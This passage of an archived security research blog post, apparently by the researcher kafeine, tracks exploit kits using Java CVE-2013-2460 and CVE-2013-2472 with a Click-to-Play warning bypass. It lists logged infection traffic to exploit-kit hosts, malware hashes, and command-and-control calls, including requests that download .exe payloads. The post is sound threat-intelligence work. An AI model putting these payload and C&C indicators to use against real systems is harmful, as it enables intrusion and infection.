+              <li><a href="http://malware2.dontneedcoffee.com/faq/">FAQ</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/headers/">Header Styles</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-full-width-image/">Header with Full-Width-Image</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-pattern/">Header with Image and Pattern</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-color/">Header with image and color</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-logo-only/">Header Only With Logo</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-with-text/">Header With Text</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header/">No Header</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header-but-image/">No Header but Image</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/documentation/">Documentation</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/changelog/">Changelog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/roadmap/">Roadmap</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+        
+      </ul>
+    </section>
+  </nav>
+</div><!-- /#navigation -->
+
+	
+
+	
+
+<div id="masthead-no-image-header">
+	<div class="row">
+		<div class="small-12 columns">
+			<a id="logo" href="http://malware2.dontneedcoffee.com" title="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+				<img src="http://malware2.dontneedcoffee.com/assets/img/logo.png" alt="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+			</a>
+		</div><!-- /.small-12.columns -->
+	</div><!-- /.row -->
+</div><!-- /#masthead -->
+
+
+
+
+
+
+
+
+	<div class="row t30">
+	<div class="medium-8 columns medium-offset-2 end">
+		<article itemscope itemtype="http://schema.org/Article">
+			<header>
+				
+
+				<div itemprop="name">
+					
+					<h1>jre7u21 and earlier Click-2-Play Warning Bypass integrating Exploit Kits</h1>
+				</div>
+			</header>
+
+
+			
+
+			<div itemprop="articleSection">
+			<div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-lLsrXgc9cxw/UkG_RMUb-rI/AAAAAAAABNY/01117FxxviQ/s1600/screenshot_2013-09-20_002.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-lLsrXgc9cxw/UkG_RMUb-rI/AAAAAAAABNY/01117FxxviQ/s1600/screenshot_2013-09-20_002.png" /></a></div><br /><br />A new variant of a "Kore-ish" Cool EK appeared few days ago.<br />Yes...it's difficult to follow the EK fast moving landscape...No payload in the jar for that one.<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-_ZnIVGJpp-c/UjtpyAZ_-jI/AAAAAAAABHU/cq4ywbe7Bek/s1600/screenshot_2013-09-19_014.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="222" src="http://3.bp.blogspot.com/-_ZnIVGJpp-c/UjtpyAZ_-jI/AAAAAAAABHU/cq4ywbe7Bek/s320/screenshot_2013-09-19_014.png" width="320" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Some instances of this "Cool EK"<br />&nbsp;in <a href="http://urlquery.net/search.php?q=.*%2Findex.php%5C%3Fp%3D5%5B0-9%5D%7B3%7D&amp;type=regexp">URLQuery</a></td></tr></tbody></table>I faced it often where I used to see Kore (aka Sibhost) Exploit Kit.<br />It is also used to spread the <a href="http://malware.dontneedcoffee.com/2013/07/urausy-ransomware-july-2013-design.html">Urausy Ransomware</a> and FakeAV (so... <a href="http://malware.dontneedcoffee.com/2013/05/the-missing-link-some-lights-on-urausy.html">BestAV stuff</a>)<br /><br />All jar found there were identical as those in Blackhole. Till today.<br /><br /><b><u>CVE-2013-2460 + Click2Play Bypass :</u></b><br /><b><u><br /></u></b>That CVE was already in use in&nbsp;<a href="http://malware.dontneedcoffee.com/2013/07/pep-new-bep.html">Private Exploit Pack</a>&nbsp;but it was noisy (Imposition then made it optional )<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-2lt9STySjC4/Uj2l3FKl9zI/AAAAAAAABK4/fGavJH-Q6WI/s1600/screenshot_2013-09-19_015.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="266" src="http://3.bp.blogspot.com/-2lt9STySjC4/Uj2l3FKl9zI/AAAAAAAABK4/fGavJH-Q6WI/s640/screenshot_2013-09-19_015.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2013-2460 successfull path in Cool EK (Kore-ish)<br />Click2Play Bypass inside 2013-09-20</td></tr></tbody></table><br /><br /><div class="separator" style="clear: both; text-align: center;"></div><span style="color: blue;">GET http://[redacted].tacogratis .com/index.php?p=5267</span><br /><span style="color: blue;">200 OK (text/html)</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-USX5nqllcpk/Ujt67egItCI/AAAAAAAABHw/UakjENtuBGA/s1600/screenshot_2013-09-20_001.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://2.bp.blogspot.com/-USX5nqllcpk/Ujt67egItCI/AAAAAAAABHw/UakjENtuBGA/s1600/screenshot_2013-09-20_001.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Key Piece of the landing</td></tr></tbody></table><br /><br /><span style="color: #45818e;">GET http://[redacted].tacogratis .com/index.php?p=5290</span><br /><span style="color: #45818e;">200 OK (text/javascript)</span><br /><br /><span style="color: red;">GET http://[redacted].tacogratis .com/index.php?p=5268&nbsp;<a href="https://www.virustotal.com/fr/file/fb1decbef1c4361eb421a3496201ef30/analysis/">fb1decbef1c4361eb421a3496201ef30</a></span><br /><span style="color: red;">200 OK (application/java-archive)</span><br /><span style="color: red;"><br /></span><span style="color: red;">GET http://</span><span style="color: red;">[redacted]</span><span style="color: red;">.tacogratis .com/index.php?p=5268</span><br /><span style="color: red;">200 OK (application/java-archive)</span><br /><br />GET http://cghtuj.tacogratis .com/index.php?p=5275&amp;e=14<br />200 OK (application/x-msdownload) &nbsp;<a href="https://www.virustotal.com/fr/file/170896de44d75651bbbd9358b0f11c34/analysis/">170896de44d75651bbbd9358b0f11c34</a>&nbsp;(<a href="http://malware.dontneedcoffee.com/2013/07/urausy-ransomware-july-2013-design.html">Urausy Ransomware</a>)<br /><br />----- Off Topic ----<br />Payload is rotating fast (2 more md5) :<br /><a href="https://www.virustotal.com/fr/file/b56348220f83ad9db50cb5beb564148b/analysis/">b56348220f83ad9db50cb5beb564148b</a><br /><a href="https://www.virustotal.com/fr/file/64ef8f2cb215af4b2fbcb51cadfcc025/analysis/">64ef8f2cb215af4b2fbcb51cadfcc025</a><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-2MThFVx08FE/Ujvg-SED99I/AAAAAAAABIk/vmgMbLFTkLs/s1600/screenshot_2013-09-19_009.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="154" src="http://1.bp.blogspot.com/-2MThFVx08FE/Ujvg-SED99I/AAAAAAAABIk/vmgMbLFTkLs/s200/screenshot_2013-09-19_009.png" width="200" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Urauy Ransomware - DE design - 2013-09-20<br />(BestAV soft 2)</td></tr></tbody></table><br /><br />Note : on another thread you can get &nbsp;a FakeAV<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-R-sRg5zvvzk/Uj2mCRly7QI/AAAAAAAABLA/9khopBV6-QQ/s1600/screenshot_2013-09-20_003.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://4.bp.blogspot.com/-R-sRg5zvvzk/Uj2mCRly7QI/AAAAAAAABLA/9khopBV6-QQ/s1600/screenshot_2013-09-20_003.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Payload call with bigger charge</td></tr></tbody></table><br /><br /><a href="https://www.virustotal.com/fr/file/9d8d3094849f685859945140721aafb1/analysis/">9d8d3094849f685859945140721aafb1</a><br /><a href="https://www.virustotal.com/fr/file/7fb9423c4bdf7080137745e81ba38362/analysis/">7fb9423c4bdf7080137745e81ba38362</a><br /><a href="https://www.virustotal.com/fr/file/13e24b552ea472146495ac8a33cca975/analysis/">13e24b552ea472146495ac8a33cca975</a><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-wSZYT_9B0vg/UjvgFyCyEWI/AAAAAAAABIc/hgcm8lxMpt0/s1600/screenshot_2013-09-20_004.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="121" src="http://2.bp.blogspot.com/-wSZYT_9B0vg/UjvgFyCyEWI/AAAAAAAABIc/hgcm8lxMpt0/s200/screenshot_2013-09-20_004.png" width="200" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Other payload from this "Kore-ish" Cool EK<br />(BestAV Soft1)</td></tr></tbody></table>-------------------<br /><br /><u>So what's that &nbsp;Click2Play bypass ?</u><br /><br />Quite surely :&nbsp;<a href="http://seclists.org/bugtraq/2013/Jul/41">http://seclists.org/bugtraq/2013/Jul/41</a><br />2013-06-18 - Vulnerability Fixed in Java 7u25<br /><br />Yes :<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td><a href="http://4.bp.blogspot.com/-yWb4_8rVXko/Ujt7nnkHB6I/AAAAAAAABH4/CBUduueLcd0/s1600/screenshot_2013-09-19_012.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="320" src="http://4.bp.blogspot.com/-yWb4_8rVXko/Ujt7nnkHB6I/AAAAAAAABH4/CBUduueLcd0/s320/screenshot_2013-09-19_012.png" width="303" /></a></td></tr><tr><td class="tr-caption" style="font-size: 13px;">Warning with jre7u25<br />(and as CVE-2013-2460 is patch too...clicking on run there won't put you at risk)<br /><div><br /></div><div><br /></div></td></tr></tbody></table>It's the first time I see that.<br />5 days ago :<br /><blockquote class="twitter-tweet">EKs vs jre7u21 : <a href="http://t.co/jCkdtnp7NW">http://t.co/jCkdtnp7NW</a><br />— kafeine (@kafeine) <a href="https://twitter.com/kafeine/statuses/379177957849194496">September 15, 2013</a></blockquote><script async="" charset="utf-8" src="//platform.twitter.com/widgets.js"></script> <br /><u>Who sold it ?</u><br />??<br /><br />No download link for now. Yes it will spread fast anyway.<br />It's easy to get rid of all these Exploit Kits : update !<br /><br />&lt;edit1 2013-09-21&gt;<br />Already in Sakura...surely cause of that blog post. It's often difficult to decide how much you can write about something.<br /><br /><b><u>Sakura CVE-2013-2460 &amp; Click2Play Bypass :</u></b><br /><b><u><br /></u></b><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-IXxboRUE4uc/Uj2j6SQF_PI/AAAAAAAABKs/E1I48bAIc2A/s1600/screenshot_2013-09-21_003.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="222" src="http://1.bp.blogspot.com/-IXxboRUE4uc/Uj2j6SQF_PI/AAAAAAAABKs/E1I48bAIc2A/s640/screenshot_2013-09-21_003.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;"><div style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 11px; line-height: 19px;">Sakura featuring CVE-2013-2460 &amp; Click2Play bypass</div><div style="background-color: white; color: #333333; font-family: 'Helvetica Neue Light', HelveticaNeue-Light, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 11px; line-height: 19px;">2013-09-21</div></td></tr></tbody></table><b><u><br /></u></b><span style="color: blue;"><br /></span><span style="color: blue;">GET http://[redacted]253 .pw:8509/me.php<br />200 OK (text/html)</span><br /><div class="separator" style="clear: both; text-align: center;"><br /></div><div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-kXaEUjVfg5c/Uj1FwxOSWWI/AAAAAAAABI0/neGyO_9gBQs/s1600/screenshot_2013-09-21_004.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://4.bp.blogspot.com/-kXaEUjVfg5c/Uj1FwxOSWWI/AAAAAAAABI0/neGyO_9gBQs/s1600/screenshot_2013-09-21_004.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Precision Strike<br />new Click2Play bypass for 21 version</td></tr></tbody></table><div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-Onz2s2kX3fY/Uj2hF6KqvCI/AAAAAAAABKQ/SX0OyzdICIQ/s1600/screenshot_2013-09-21_006.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="286" src="http://2.bp.blogspot.com/-Onz2s2kX3fY/Uj2hF6KqvCI/AAAAAAAABKQ/SX0OyzdICIQ/s640/screenshot_2013-09-21_006.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Jnlp call</td></tr></tbody></table><span style="color: red;"><br /></span><span style="color: red;">GET http://[redacted]&nbsp;.pw:8509/[redacted].ee</span><br /><span style="color: red;">200 OK (application/java-archive)&nbsp;<a href="https://www.virustotal.com/fr/file/dca89d839abbb8f621a87de94d20d8f2/analysis/">dca89d839abbb8f621a87de94d20d8f2</a>&nbsp;</span>CVE-2013-2460<br /><div><span style="color: red;"><br /></span></div><div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/--1gF5j6FIT0/Uj1NtxpJwgI/AAAAAAAABJg/R7SkM3BPY5Q/s1600/screenshot_2013-09-21_010.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="118" src="http://2.bp.blogspot.com/--1gF5j6FIT0/Uj1NtxpJwgI/AAAAAAAABJg/R7SkM3BPY5Q/s640/screenshot_2013-09-21_010.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Piece of CVE-2013-2460 in Sakura Jar <br />2013-09-21<br /><br /><br /></td></tr></tbody></table>&nbsp;<span style="color: red;">GET http:/</span><span style="color: red;">/</span><span style="color: red;">[redacted]</span><span style="color: red;">&nbsp;.pw</span><span style="color: red;">:8509/bodystarswild.ee</span><br /><div><span style="color: red;">200 OK (application/java-archive)</span><br /><br /><div>GET http://[redacted] .pw:8509/2889.ld<br /><div>200 OK (application/octet-stream) Once decoded : <a href="https://www.virustotal.com/fr/file/5fba8226303967ccfd27ea8710a8b99d/analysis/">5fba8226303967ccfd27ea8710a8b99d</a> I think it's a Smokebot</div><div><br /></div><div>----- Off Topic ----</div><div><i>C&amp;C Calls :</i></div><div><i>mexstat757.com POST /satep757/index.php</i><br /><i>mexstat220.pw GET /setex/sev57.exe&nbsp;</i></div><div><i>mexstat220.pw &nbsp;GET &nbsp;/setex/pm555.exe</i></div></div></div><div><i>etc...</i><br /><i><br /></i><i>46.165.201.27&nbsp;</i><br /><i>16265 | 46.165.192.0/18 | LEASEWEB | DE | LEASEWEB.COM | LEASEWEB GERMANY GMBH</i></div><div><i><br /></i></div><div><i>It's the same guys than those who were behind this one year old post :</i></div><div><div><i><a href="http://malware.dontneedcoffee.com/2012/09/from-sakura-to-reveton-via-smoke-bot-or.html">From Sakura to Reveton via Smoke Bot - Or a Botnet Distribution of Reveton&nbsp;</a>&nbsp;2012-09-12</i></div><div><i>Since then Smoke Bot is now encrypting its network calls.</i></div><div><i><br /></i></div><div><i><a href="http://files.dontneedcoffee.com/joesandbox/report-5fba8226303967ccfd27ea8710a8b99d.html">Analysis</a> by&nbsp;<a href="http://www.joesecurity.org/joe-sandbox-cloud">Joe Sandbox Cloud</a></i></div><div>----------------------&nbsp;</div></div>&lt;/edit1&gt;<br />&lt;edit2: 2013-09-23&gt;<br /><b><u>Nuclear Pack : CVE-2013-2460 + Click2Play bypass</u></b><br /><br />Announced Underground :<br />"<span style="color: #134f5c;">добавлен новы exploit, пробив увеличен. работает тихо и не палится</span>" &nbsp;Nuclear<br />which means something like:<br />"<span style="color: #351c75;">New exploit added, breaking rate increased, works silently and scorched</span>"<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-da8AUxpDGSQ/UkALpogHciI/AAAAAAAABLw/0OmJ0K-9LqU/s1600/screenshot_2013-09-23_003.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="226" src="http://3.bp.blogspot.com/-da8AUxpDGSQ/UkALpogHciI/AAAAAAAABLw/0OmJ0K-9LqU/s640/screenshot_2013-09-23_003.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2013-2460 with no security prompt successful path in Nuclear Pack<br />2013-09-23</td></tr></tbody></table><br /><br /><span style="color: blue;">GET http://[redacted].flogdoyfohoqobl .biz:12421/3dfa4ffa555573ba6fbb54a243289806/4/5b1bb46b5a96bee3ebbb1d2251d968bb.html<br />200 OK (text/html)</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-P-MRZRBiE_Y/UkAflClsPjI/AAAAAAAABMA/SJBxN_rm1QY/s1600/screenshot_2013-09-23_005.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://4.bp.blogspot.com/-P-MRZRBiE_Y/UkAflClsPjI/AAAAAAAABMA/SJBxN_rm1QY/s1600/screenshot_2013-09-23_005.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Precision Strike&nbsp;&nbsp;(Thanks&nbsp;<a href="https://twitter.com/EKWatcher">@EKWatcher</a>&nbsp;)</td></tr></tbody></table><div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-zqZfcQE3SAc/UkAicd7lccI/AAAAAAAABMU/TCiAlXwftyg/s1600/screenshot_2013-09-23_006.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="394" src="http://2.bp.blogspot.com/-zqZfcQE3SAc/UkAicd7lccI/AAAAAAAABMU/TCiAlXwftyg/s640/screenshot_2013-09-23_006.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">jnlp call in Nuclear Pack<br />After Deobfuscation (Thanks&nbsp;<a href="https://twitter.com/EKWatcher">@EKWatcher</a>&nbsp;)</td></tr></tbody></table><br /><br /><span style="color: red;">GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar<br />200 OK (application/java)</span><br /><br /><span style="color: red;">GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar<br />200 OK (application/java)</span>&nbsp;<a href="https://www.virustotal.com/fr/file/e03455403f226b23be42b30733a26101/analysis/">e03455403f226b23be42b30733a26101</a><br /><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-WgjejyMr8R8/Uj_-PFc_BRI/AAAAAAAABLg/UJW6comy0CU/s1600/screenshot_2013-09-23_001.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="68" src="http://2.bp.blogspot.com/-WgjejyMr8R8/Uj_-PFc_BRI/AAAAAAAABLg/UJW6comy0CU/s640/screenshot_2013-09-23_001.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Piece of CVE-2013-2460 in Nuclear Pack <br />2013-09-23</td></tr></tbody></table>GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2<br />200 OK (application/octet-stream) Decoded :&nbsp;<a href="https://www.virustotal.com/fr/file/3a9d1dcad1176717711eb92b25f7d6b0/analysis/">3a9d1dcad1176717711eb92b25f7d6b0</a><br /><br />GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2/2<br />200 OK (application/octet-stream)<br /><br />----------- Out of Topic -----------<br />C&amp;C :<br />185.6.80.125 -&nbsp;61422 | 185.6.80.0/24 | TD-VITA | RU | - | TD-VITA LLC.<br />for instance :<br /><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">POST /mBj7</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">cjhH/gate.</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">php HTTP/1</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">.1</span><br /><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">Content-Ty</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">pe: applic</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">ation/x-ww</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">w-form-url</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">encoded</span><br /><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">Connection</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">: close</span><br /><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">User-Agent</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">: Mozilla/</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">4.0</span><br /><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">Host: hali</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">faxkilo.co</span><wbr style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;"></wbr><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: pre-wrap;">m</span><br /><br /><i><a href="http://files.dontneedcoffee.com/joesandbox/report-3a9d1dcad1176717711eb92b25f7d6b0.html">Analysis</a>&nbsp;by&nbsp;<a href="http://www.joesecurity.org/joe-sandbox-cloud">Joe Sandbox Cloud</a></i><br />------------------------------------<br />&lt;/edit2&gt;<br />&lt;edit3&gt;<br /><b><u>Styx CVE-2013-2472 + Click2Play Bypass :</u></b><br /><br />Many Thanks to <a href="https://twitter.com/TimoHirvonen">Timo Hirvonen</a> from F-Secure for identifying the CVE.<br /><blockquote class="twitter-tweet">Styx Java exploit mentioned by <a href="https://twitter.com/kafeine">@kafeine</a> in his blog exploits CVE-2013-2472. This is the first time we see it exploited by cyber criminals<br />— Timo Hirvonen (@TimoHirvonen) <a href="https://twitter.com/TimoHirvonen/statuses/382530592102817792">September 24, 2013</a></blockquote><script async="" charset="utf-8" src="//platform.twitter.com/widgets.js"></script> <br /><div class="separator" style="clear: both; text-align: center;"></div><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-GVn0xkxeJtA/UkG-b3V4QSI/AAAAAAAABNQ/1XDwAMEL4r0/s1600/screenshot_2013-09-24_010.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="162" src="http://1.bp.blogspot.com/-GVn0xkxeJtA/UkG-b3V4QSI/AAAAAAAABNQ/1XDwAMEL4r0/s640/screenshot_2013-09-24_010.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Reveton Pushed in Styx 2013-09-24<br />Using CVE-2013-2472 &amp; Click2Play Bypass on jre7u21<br />We can see the call for Bitcoin miner after VM 